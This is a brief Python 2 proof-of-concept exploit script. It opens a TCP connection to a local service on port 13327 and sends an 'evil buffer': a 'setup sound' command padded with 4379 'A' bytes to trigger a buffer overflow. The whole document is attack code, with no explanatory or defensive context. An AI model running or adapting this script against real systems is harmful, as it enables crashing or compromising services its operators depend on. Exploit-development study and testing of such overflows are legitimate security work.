#!/usr/bin/python
import socket

RHOST = "127.0.0.1"
RPORT = 13327

crash = ""
crash += "\x41" * 4379
buf = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "[*]Sending evil buffer..."
s.connect((RHOST, RPORT))
data = s.recv(1024)
print data

s.send(buf)
s.close()
print "[*]Payload Sent!"
